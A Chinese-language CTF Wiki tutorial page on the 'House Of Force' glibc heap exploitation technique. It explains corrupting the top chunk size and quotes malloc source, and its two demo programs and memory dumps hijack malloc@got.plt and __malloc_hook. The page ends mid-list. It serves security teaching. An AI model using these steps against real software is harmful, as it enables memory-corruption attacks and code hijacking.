


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" lang="zh_CN">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>House Of Force &#8212; CTF Wiki </title>
    <link rel="stylesheet" href="../../_static/cloud.css" type="text/css" />
    <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
    <link rel="stylesheet" href="../../_static/css/custom.css" type="text/css" />
    <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Noticia+Text|Open+Sans|Droid+Sans+Mono" type="text/css" />
    <script type="text/javascript">
      var DOCUMENTATION_OPTIONS = {
        URL_ROOT:    '../../',
        VERSION:     '',
        COLLAPSE_INDEX: false,
        FILE_SUFFIX: '.html',
        HAS_SOURCE:  true,
        SOURCELINK_SUFFIX: '.txt'
      };
    </script>
    <script type="text/javascript" src="../../_static/jquery.js"></script>
    <script type="text/javascript" src="../../_static/underscore.js"></script>
    <script type="text/javascript" src="../../_static/doctools.js"></script>
    <script type="text/javascript" src="../../_static/translations.js"></script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <script type="text/javascript" src="../../_static/jquery.cookie.js"></script>
    <script type="text/javascript" src="../../_static/cloud.base.js"></script>
    <script type="text/javascript" src="../../_static/cloud.js"></script>
    <link rel="shortcut icon" href="../../_static/favicon.ico"/>
    <link rel="search" title="搜索" href="../../search.html" />
    <link rel="next" title="Unsorted Bin Attack" href="unsorted_bin_attack.html" />
    <link rel="prev" title="House of Lore" href="house_of_lore.html" /> 
        <meta name="viewport" content="width=device-width, initial-scale=1">
  </head>
  <body>
    <div class="relbar-top">
        
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>导航</h3>
      <ul>
        <li class="right" style="margin-right: 10px">
          <a href="../../index.html" title="內容目录"
             accesskey="C">toc</a></li>
        <li class="right" >
          <a href="unsorted_bin_attack.html" title="Unsorted Bin Attack"
             accesskey="N">下一页</a> &nbsp; &nbsp;</li>
        <li class="right" >
          <a href="house_of_lore.html" title="House of Lore"
             accesskey="P">上一页</a> &nbsp; &nbsp;</li>
    <li><a href="../../index.html">CTF Wiki </a> &#187;</li>

          <li class="nav-item nav-item-1"><a href="index.html" accesskey="U">堆利用</a> &#187;</li> 
      </ul>
    </div>
    </div>
  

    <div class="document">
      <div class="documentwrapper">
        <div class="bodywrapper">
          <div class="body" role="main">
            
  <div class="section" id="house-of-force">
<h1>House Of Force<a class="headerlink" href="#house-of-force" title="永久链接至标题">¶</a></h1>
<div class="section" id="id1">
<h2>介绍<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h2>
<p>House Of Force 属于 House Of XXX 系列的利用方法，House Of XXX 是 2004 年《The Malloc Maleficarum-Glibc Malloc Exploitation Techniques》中提出的一系列针对 glibc 堆分配器的利用方法。
但是，由于年代久远《The Malloc Maleficarum》中提出的大多数方法今天都不能奏效，我们现在所指的 House Of XXX 利用相比 2004 年文章中写的已有较大的不同。但是《The Malloc
Maleficarum》依然是一篇推荐阅读的文章，你可以在这里读到它的原文： <a class="reference external" href="https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt">https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt</a></p>
</div>
<div class="section" id="id2">
<h2>原理<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h2>
<p>House Of Force 是一种堆利用方法，但是并不是说 House Of Force 必须得基于堆漏洞来进行利用。如果一个堆(heap based) 漏洞想要通过 House Of Force 方法进行利用，需要以下条件：</p>
<ol class="arabic simple">
<li>能够以溢出等方式控制到 top chunk 的 size 域</li>
<li>能够自由地控制堆分配尺寸的大小</li>
</ol>
<p>House Of Force 产生的原因在于 glibc 对 top chunk 的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p>
<p>那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk指向我们期望的任何位置，这就相当于一次任意地址写。然而在 glibc 中，会对用户请求的大小和 top chunk
现有的 size 进行验证</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>// 获取当前的top chunk，并计算其对应的大小
victim = av-&gt;top;
size   = chunksize(victim);
// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av-&gt;top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
</pre></div>
</div>
<p>然而，如果可以篡改 size 为一个很大值，就可以轻松的通过这个验证，这也就是我们前面说的需要一个能够控制top chunk size 域的漏洞。</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">unsigned</span> <span class="n">long</span><span class="p">)</span> <span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="n">unsigned</span> <span class="n">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span> <span class="o">+</span> <span class="n">MINSIZE</span><span class="p">)</span>
</pre></div>
</div>
<p>一般的做法是把 top chunk 的 size 改为-1，因为在进行比较时会把 size 转换成无符号数，因此 -1 也就是说unsigned long 中最大的数，所以无论如何都可以通过验证。</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">remainder</span>      <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
<span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span>        <span class="o">=</span> <span class="n">remainder</span><span class="p">;</span>

<span class="o">/*</span> <span class="n">Treat</span> <span class="n">space</span> <span class="n">at</span> <span class="n">ptr</span> <span class="o">+</span> <span class="n">offset</span> <span class="k">as</span> <span class="n">a</span> <span class="n">chunk</span> <span class="o">*/</span>
<span class="c1">#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</span>
</pre></div>
</div>
<p>之后这里会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值(write-anything-anywhere)。</p>
<p><strong>与此同时，我们需要注意的是，topchunk的size也会更新，其更新的方法如下</strong></p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">victim</span> <span class="o">=</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span><span class="p">;</span>
<span class="n">size</span>   <span class="o">=</span> <span class="n">chunksize</span><span class="p">(</span><span class="n">victim</span><span class="p">);</span>
<span class="n">remainder_size</span> <span class="o">=</span> <span class="n">size</span> <span class="o">-</span> <span class="n">nb</span><span class="p">;</span>
<span class="n">set_head</span><span class="p">(</span><span class="n">remainder</span><span class="p">,</span> <span class="n">remainder_size</span> <span class="o">|</span> <span class="n">PREV_INUSE</span><span class="p">);</span>
</pre></div>
</div>
<p>所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。</p>
</div>
<div class="section" id="id3">
<h2>简单示例1<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h2>
<p>在学习完 HOF 的原理之后，我们这里通过一个示例来说明 HOF 的利用，这个例子的目标是通过HOF来篡改 <code class="docutils literal"><span class="pre">malloc&#64;got.plt</span></code> 实现劫持程序流程</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">long</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span><span class="o">*</span><span class="n">ptr2</span><span class="p">;</span>
    <span class="n">ptr</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="n">ptr</span><span class="o">=</span><span class="p">(</span><span class="n">long</span> <span class="o">*</span><span class="p">)(((</span><span class="n">long</span><span class="p">)</span><span class="n">ptr</span><span class="p">)</span><span class="o">+</span><span class="mi">24</span><span class="p">);</span>
    <span class="o">*</span><span class="n">ptr</span><span class="o">=-</span><span class="mi">1</span><span class="p">;</span>        <span class="o">//</span> <span class="o">&lt;===</span> <span class="n">这里把top</span> <span class="n">chunk的size域改为0xffffffffffffffff</span>
    <span class="n">malloc</span><span class="p">(</span><span class="o">-</span><span class="mi">4120</span><span class="p">);</span>  <span class="o">//</span> <span class="o">&lt;===</span> <span class="n">减小top</span> <span class="n">chunk指针</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>   <span class="o">//</span> <span class="o">&lt;===</span> <span class="n">分配块实现任意地址写</span>
<span class="p">}</span>
</pre></div>
</div>
<p>首先，我们分配一个 0x10 字节大小的块</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="mh">0x602000</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000021</span> <span class="o">&lt;===</span> <span class="n">ptr</span>
<span class="mh">0x602010</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x602020</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000020fe1</span> <span class="o">&lt;===</span> <span class="n">top</span> <span class="n">chunk</span>
<span class="mh">0x602030</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
</pre></div>
</div>
<p>之后把 top chunk 的 size 改为 0xffffffffffffffff，在真正的题目中，这一步可以通过堆溢出等漏洞来实现。 因为 -1 在补码中是以 0xffffffffffffffff 表示的，所以我们直接赋值 -1 就可以。</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="mh">0x602000</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000021</span> <span class="o">&lt;===</span> <span class="n">ptr</span>
<span class="mh">0x602010</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x602020</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0xffffffffffffffff</span> <span class="o">&lt;===</span> <span class="n">top</span> <span class="n">chunk</span> <span class="n">size域被更改</span>
<span class="mh">0x602030</span><span class="p">:</span>   <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
</pre></div>
</div>
<p>注意此时的 top chunk 位置，当我们进行下一次分配的时候就会更改 top chunk 的位置到我们想要的地方</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="mh">0x7ffff7dd1b20</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">&gt;</span><span class="p">:</span>    <span class="mh">0x0000000100000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x7ffff7dd1b30</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x7ffff7dd1b40</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x7ffff7dd1b50</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x7ffff7dd1b60</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x7ffff7dd1b70</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">80</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000602020</span> <span class="o">&lt;===</span> <span class="n">top</span> <span class="n">chunk此时一切正常</span>
<span class="mh">0x7ffff7dd1b80</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">96</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>  <span class="mh">0x00007ffff7dd1b78</span>
</pre></div>
</div>
<p>接下来我们执行<code class="docutils literal"><span class="pre">malloc(-4120);</span></code>，-4120是怎么得出的呢？ 首先，我们需要明确要写入的目的地址，这里我编译程序后，0x601020 是 <code class="docutils literal"><span class="pre">malloc&#64;got.plt</span></code> 的地址</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="mh">0x601020</span><span class="p">:</span>   <span class="mh">0x00007ffff7a91130</span> <span class="o">&lt;===</span> <span class="n">malloc</span><span class="nd">@got</span><span class="o">.</span><span class="n">plt</span>
</pre></div>
</div>
<p>所以我们应该将 top chunk 指向 0x601010 处，这样当下次再分配 chunk 时，就可以分配到 <code class="docutils literal"><span class="pre">malloc&#64;got.plt</span></code> 处的内存了。</p>
<p>之后明确当前 top chunk 的地址，根据前面描述，top chunk 位于 0x602020，所以我们可以计算偏移如下</p>
<p>0x601010-0x602020=-4112</p>
<p>此外，用户申请的内存大小，一旦进入申请内存的函数中就变成了无符号整数。</p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">void</span> <span class="o">*</span><span class="n">__libc_malloc</span><span class="p">(</span><span class="n">size_t</span> <span class="nb">bytes</span><span class="p">)</span> <span class="p">{</span>
</pre></div>
</div>
<p>如果想要用户输入的大小经过内部的 <code class="docutils literal"><span class="pre">checked_request2size</span></code>可以得到这样的大小，即</p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span>/*
   Check if a request is so large that it would wrap around zero when
   padded and aligned. To simplify some other code, the bound is made
   low enough so that adding MINSIZE will also not wrap around zero.
 */

#define REQUEST_OUT_OF_RANGE(req)                                              \
    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))
/* pad request bytes into a usable size -- internal version */
//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1
#define request2size(req)                                                      \
    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \
         ? MINSIZE                                                             \
         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)

/*  Same, except also perform argument check */

#define checked_request2size(req, sz)                                          \
    if (REQUEST_OUT_OF_RANGE(req)) {                                           \
        __set_errno(ENOMEM);                                                   \
        return 0;                                                              \
    }                                                                          \
    (sz) = request2size(req);
</pre></div>
</div>
<p>一方面，我们需要绕过 REQUEST_OUT_OF_RANGE(req) 这个检测，即我们传给 malloc 的值在负数范围内，不得大于 -2 * MINSIZE，这个一般情况下都是可以满足的。</p>
<p>另一方面，在满足对应的约束后，我们需要使得 <code class="docutils literal"><span class="pre">request2size</span></code>正好转换为对应的大小，也就是说，我们需要使得 ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK 恰好为-4112。首先，很显然，-4112 是
chunk 对齐的，那么我们只需要将其分别减去 SIZE_SZ，MALLOC_ALIGN_MASK 就可以得到对应的需要申请的值。其实我们这里只需要减 SIZE_SZ 就可以了，因为多减的 MALLOC_ALIGN_MASK 最后还会被对齐掉。而<strong>如果 -4112
不是 MALLOC_ALIGN 的时候，我们就需要多减一些了。当然，我们最好使得分配之后得到的 chunk 也是对齐的，因为在释放一个 chunk 的时候，会进行对齐检查。</strong></p>
<p>因此，我们当调用<code class="docutils literal"><span class="pre">malloc(-4120)</span></code>之后，我们可以观察到 top chunk 被抬高到我们想要的位置</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="mh">0x7ffff7dd1b20</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">&gt;</span><span class="p">:</span>\   <span class="mh">0x0000000100000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x7ffff7dd1b30</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x7ffff7dd1b40</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x7ffff7dd1b50</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x7ffff7dd1b60</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x7ffff7dd1b70</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">80</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000601010</span> <span class="o">&lt;===</span> <span class="n">可以观察到top</span> <span class="n">chunk被抬高</span>
<span class="mh">0x7ffff7dd1b80</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">96</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>  <span class="mh">0x00007ffff7dd1b78</span>
</pre></div>
</div>
<p>之后，我们分配的块就会出现在 0x601010+0x10 的位置，也就是 0x601020 可以更改 got 表中的内容了。</p>
<p>但是需要注意的是，在被抬高的同时，<a class="reference external" href="mailto:malloc&#37;&#52;&#48;got">malloc<span>&#64;</span>got</a> 附近的内容也会被修改。</p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span>set_head(victim, nb | PREV_INUSE |
        (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
</pre></div>
</div>
</div>
<div class="section" id="id4">
<h2>简单示例2<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h2>
<p>在上一个示例中，我们演示了通过 HOF 使得 top chunk 的指针减小来修改位于其上面(低地址)的got表中的内容， 但是 HOF 其实也可以使得 top chunk 指针增大来修改位于高地址空间的内容，我们通过这个示例来演示这一点</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">long</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span><span class="o">*</span><span class="n">ptr2</span><span class="p">;</span>
    <span class="n">ptr</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="n">ptr</span><span class="o">=</span><span class="p">(</span><span class="n">long</span> <span class="o">*</span><span class="p">)(((</span><span class="n">long</span><span class="p">)</span><span class="n">ptr</span><span class="p">)</span><span class="o">+</span><span class="mi">24</span><span class="p">);</span>
    <span class="o">*</span><span class="n">ptr</span><span class="o">=-</span><span class="mi">1</span><span class="p">;</span>                 <span class="o">&lt;===</span> <span class="n">修改top</span> <span class="n">chunk</span> <span class="n">size</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mi">140737345551056</span><span class="p">);</span> <span class="o">&lt;===</span> <span class="n">增大top</span> <span class="n">chunk指针</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>
<p>我们可以看到程序代码与简单示例1基本相同，除了第二次 malloc 的 size 有所不同。 这次我们的目标是 malloc_hook，我们知道 malloc_hook 是位于 libc.so 里的全局变量值，首先查看内存布局</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Start</span>              <span class="n">End</span>                <span class="n">Offset</span>             <span class="n">Perm</span> <span class="n">Path</span>
<span class="mh">0x0000000000400000</span> <span class="mh">0x0000000000401000</span> <span class="mh">0x0000000000000000</span> <span class="n">r</span><span class="o">-</span><span class="n">x</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">vb</span><span class="o">/</span><span class="n">桌面</span><span class="o">/</span><span class="n">tst</span><span class="o">/</span><span class="n">t1</span>
<span class="mh">0x0000000000600000</span> <span class="mh">0x0000000000601000</span> <span class="mh">0x0000000000000000</span> <span class="n">r</span><span class="o">--</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">vb</span><span class="o">/</span><span class="n">桌面</span><span class="o">/</span><span class="n">tst</span><span class="o">/</span><span class="n">t1</span>
<span class="mh">0x0000000000601000</span> <span class="mh">0x0000000000602000</span> <span class="mh">0x0000000000001000</span> <span class="n">rw</span><span class="o">-</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">vb</span><span class="o">/</span><span class="n">桌面</span><span class="o">/</span><span class="n">tst</span><span class="o">/</span><span class="n">t1</span>
<span class="mh">0x0000000000602000</span> <span class="mh">0x0000000000623000</span> <span class="mh">0x0000000000000000</span> <span class="n">rw</span><span class="o">-</span> <span class="p">[</span><span class="n">heap</span><span class="p">]</span>
<span class="mh">0x00007ffff7a0d000</span> <span class="mh">0x00007ffff7bcd000</span> <span class="mh">0x0000000000000000</span> <span class="n">r</span><span class="o">-</span><span class="n">x</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.23</span><span class="o">.</span><span class="n">so</span>
<span class="mh">0x00007ffff7bcd000</span> <span class="mh">0x00007ffff7dcd000</span> <span class="mh">0x00000000001c0000</span> <span class="o">---</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.23</span><span class="o">.</span><span class="n">so</span>
<span class="mh">0x00007ffff7dcd000</span> <span class="mh">0x00007ffff7dd1000</span> <span class="mh">0x00000000001c0000</span> <span class="n">r</span><span class="o">--</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.23</span><span class="o">.</span><span class="n">so</span>
<span class="mh">0x00007ffff7dd1000</span> <span class="mh">0x00007ffff7dd3000</span> <span class="mh">0x00000000001c4000</span> <span class="n">rw</span><span class="o">-</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.23</span><span class="o">.</span><span class="n">so</span>
<span class="mh">0x00007ffff7dd3000</span> <span class="mh">0x00007ffff7dd7000</span> <span class="mh">0x0000000000000000</span> <span class="n">rw</span><span class="o">-</span>
<span class="mh">0x00007ffff7dd7000</span> <span class="mh">0x00007ffff7dfd000</span> <span class="mh">0x0000000000000000</span> <span class="n">r</span><span class="o">-</span><span class="n">x</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.23</span><span class="o">.</span><span class="n">so</span>
<span class="mh">0x00007ffff7fdb000</span> <span class="mh">0x00007ffff7fde000</span> <span class="mh">0x0000000000000000</span> <span class="n">rw</span><span class="o">-</span>
<span class="mh">0x00007ffff7ff6000</span> <span class="mh">0x00007ffff7ff8000</span> <span class="mh">0x0000000000000000</span> <span class="n">rw</span><span class="o">-</span>
<span class="mh">0x00007ffff7ff8000</span> <span class="mh">0x00007ffff7ffa000</span> <span class="mh">0x0000000000000000</span> <span class="n">r</span><span class="o">--</span> <span class="p">[</span><span class="n">vvar</span><span class="p">]</span>
<span class="mh">0x00007ffff7ffa000</span> <span class="mh">0x00007ffff7ffc000</span> <span class="mh">0x0000000000000000</span> <span class="n">r</span><span class="o">-</span><span class="n">x</span> <span class="p">[</span><span class="n">vdso</span><span class="p">]</span>
<span class="mh">0x00007ffff7ffc000</span> <span class="mh">0x00007ffff7ffd000</span> <span class="mh">0x0000000000025000</span> <span class="n">r</span><span class="o">--</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.23</span><span class="o">.</span><span class="n">so</span>
<span class="mh">0x00007ffff7ffd000</span> <span class="mh">0x00007ffff7ffe000</span> <span class="mh">0x0000000000026000</span> <span class="n">rw</span><span class="o">-</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.23</span><span class="o">.</span><span class="n">so</span>
<span class="mh">0x00007ffff7ffe000</span> <span class="mh">0x00007ffff7fff000</span> <span class="mh">0x0000000000000000</span> <span class="n">rw</span><span class="o">-</span>
<span class="mh">0x00007ffffffde000</span> <span class="mh">0x00007ffffffff000</span> <span class="mh">0x0000000000000000</span> <span class="n">rw</span><span class="o">-</span> <span class="p">[</span><span class="n">stack</span><span class="p">]</span>
<span class="mh">0xffffffffff600000</span> <span class="mh">0xffffffffff601000</span> <span class="mh">0x0000000000000000</span> <span class="n">r</span><span class="o">-</span><span class="n">x</span> <span class="p">[</span><span class="n">vsyscall</span><span class="p">]</span>
</pre></div>
</div>
<p>可以看到 heap 的基址在 0x602000，而 libc 的基址在 0x7ffff7a0d000，因此我们需要通过 HOF 扩大 top chunk指针的值来实现对 malloc_hook 的写。 首先，由调试得知 __malloc_hook 的地址位于 0x7ffff7dd1b10
，采取计算</p>
<p>0x7ffff7dd1b00-0x602020-0x10=140737345551056 经过这次 malloc 之后，我们可以观察到 top chunk 的地址被抬高到了 0x00007ffff7dd1b00</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="mh">0x7ffff7dd1b20</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">&gt;</span><span class="p">:</span>    <span class="mh">0x0000000100000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x7ffff7dd1b30</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x7ffff7dd1b40</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x7ffff7dd1b50</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x7ffff7dd1b60</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>  <span class="mh">0x0000000000000000</span>
<span class="mh">0x7ffff7dd1b70</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">80</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>  <span class="mh">0x00007ffff7dd1b00</span> <span class="o">&lt;===</span> <span class="n">top</span> <span class="n">chunk</span>
<span class="mh">0x7ffff7dd1b80</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">96</span><span class="o">&gt;</span><span class="p">:</span> <span class="mh">0x0000000000000000</span>  <span class="mh">0x00007ffff7dd1b78</span>
</pre></div>
</div>
<p>之后，我们只要再次分配就可以控制 0x7ffff7dd1b10 处的 __malloc_hook 值了</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">rax</span> <span class="o">=</span> <span class="mh">0x00007ffff7dd1b10</span>

<span class="mh">0x400562</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">60</span><span class="o">&gt;</span>        <span class="n">mov</span>    <span class="n">edi</span><span class="p">,</span> <span class="mh">0x10</span>
<span class="mh">0x400567</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">65</span><span class="o">&gt;</span>        <span class="n">call</span>   <span class="mh">0x400410</span> <span class="o">&lt;</span><span class="n">malloc</span><span class="nd">@plt</span><span class="o">&gt;</span>
</pre></div>
</div>
</div>
<div class="section" id="id5">
<h2>小总结<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h2>
<p>在这一节中讲解了 House Of Force 的原理并且给出了两个利用的简单示例，通过观察这两个简单示例我们会发现其实HOF的利用要求还是相当苛刻的。</p>
<ul class="simple">
<li>首先，需要存在漏洞使得用户能够控制 top chunk 的 size 域。</li>
<li>其次，<strong>需要用户能自由控制 malloc 的分配大小</strong></li>
